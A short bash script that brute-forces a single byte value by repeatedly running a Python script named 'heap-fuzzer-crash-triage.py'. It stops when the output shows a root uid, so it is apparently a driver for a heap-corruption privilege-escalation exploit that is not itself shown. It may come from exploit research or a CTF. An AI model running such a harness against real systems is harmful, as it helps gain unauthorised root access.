#!/bin/bash

Nattempts=3

for ((b0 = 0 ; b0 <= 0xff ; b0++ )); do
    printf "Trying b0=0x%02x\n" $b0;

    for ((attempt = 0 ; attempt < $Nattempts ; attempt++ )); do 
        echo " [*] attempt: $((attempt+1))/$Nattempts"
        res=$(python3 heap-fuzzer-crash-triage.py inp.553068 "$b0" < /dev/null)
        echo "$res"
        echo "$res" | grep -e 'uid=0(root) gid=0(root) groups=0(root)' > /dev/null
        if [ $? -eq 0 ]; then
            printf "Success with b0=0x%02x\n" $b0;
            exit 0;
        fi
    done
done

echo "Did not succeed"
exit 1
